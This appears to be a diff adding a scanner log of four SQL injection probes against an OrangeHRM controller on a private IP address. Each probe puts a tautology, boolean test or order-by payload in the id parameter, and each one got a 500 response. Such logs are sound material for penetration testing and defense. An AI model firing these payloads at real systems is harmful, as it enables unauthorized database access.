@@ -1,0 +1,4 @@
+[STATUS-CODE: 500] GET URL: http://192.168.182.136/orangehrm/lib/controllers/CentralController.php?id=1'%20or%20'345'='345&reqcode=EMP&capturemode=updatemode
+[STATUS-CODE: 500] GET URL: http://192.168.182.136/orangehrm/lib/controllers/CentralController.php?id=1%20and%20345=456&reqcode=EMP&capturemode=updatemode
+[STATUS-CODE: 500] GET URL: http://192.168.182.136/orangehrm/lib/controllers/CentralController.php?id=1%20or%20345=345&reqcode=EMP&capturemode=updatemode
+[STATUS-CODE: 500] GET URL: http://192.168.182.136/orangehrm/lib/controllers/CentralController.php?id=1%20order%20by%2099999999999&reqcode=EMP&capturemode=updatemode
